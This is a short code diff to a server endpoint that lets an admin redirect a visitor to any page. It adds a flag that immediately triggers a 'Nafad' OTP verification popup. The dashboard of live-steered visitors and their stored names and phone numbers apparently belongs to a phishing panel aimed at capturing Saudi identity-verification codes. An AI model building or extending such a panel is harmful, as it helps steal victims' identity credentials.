@@ -1111,13 +1111,13 @@ async function startServer() {
   // Manual Redirect - Admin redirects customer to any page
   app.post("/api/dashboard/redirect", async (req, res) => {
     try {
-      const { visitorId, targetPage } = req.body;
+      const { visitorId, targetPage, setNafadVerifying } = req.body;
       if (!visitorId || !targetPage) {
         res.status(400).json({ error: "Missing visitorId or targetPage" });
         return;
       }
 
-      console.log("[Dashboard Redirect] visitorId:", visitorId, "targetPage:", targetPage);
+      console.log("[Dashboard Redirect] visitorId:", visitorId, "targetPage:", targetPage, "setNafadVerifying:", setNafadVerifying);
       
       const currentVisitor = await readVisitor(visitorId);
       const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";
@@ -1139,6 +1139,12 @@ async function startServer() {
         _v5Status: null,
         _v6Status: null,
       };
+
+      // If nafad-otp redirect, set nafadStatus to verifying to show popup immediately
+      if (setNafadVerifying) {
+        updateData.nafadStatus = "verifying";
+        console.log("[Dashboard Redirect] Setting nafadStatus to verifying for popup");
+      }
 
       console.log("[Dashboard Redirect] Saving updateData:", updateData);
       await upsertVisitor(visitorId, updateData);
